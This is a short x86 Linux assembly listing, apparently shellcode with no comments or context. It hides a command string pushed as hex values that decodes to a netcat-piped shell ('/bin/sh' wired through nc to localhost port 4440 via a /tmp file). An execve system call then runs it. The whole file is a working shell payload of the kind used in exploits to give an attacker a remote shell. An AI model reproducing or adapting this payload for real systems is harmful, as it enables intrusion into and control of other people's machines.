.text 

.globl _start

_start:
	xor %eax, %eax
	push %eax
	push $0x00000063
	push $0x70622f70
	push $0x6d742f3e
	push $0x31203034
	push $0x34342074
	push $0x736f686c
	push $0x61636f6c
	push $0x20636e20
	push $0x7c206370
	push $0x622f706d
	push $0x742f3c30
	push $0x2068732f
	push $0x6e69622f
	push %eax
        push $0x5663702d
	push %eax
        push $0x68732f6e
        push $0x69622f2f
        mov %esp, %esi
        mov %esi, %ebx
        push %eax
        lea 0x14(%esi), %esi
        push %esi
        lea -0x8(%esi), %esi
        push %esi
        lea -0xc(%esi), %esi
        push %esi
        mov %esp, %ecx
        xorl %edx, %edx
        movb $11, %al       
        int  $0x80
        leave
        ret

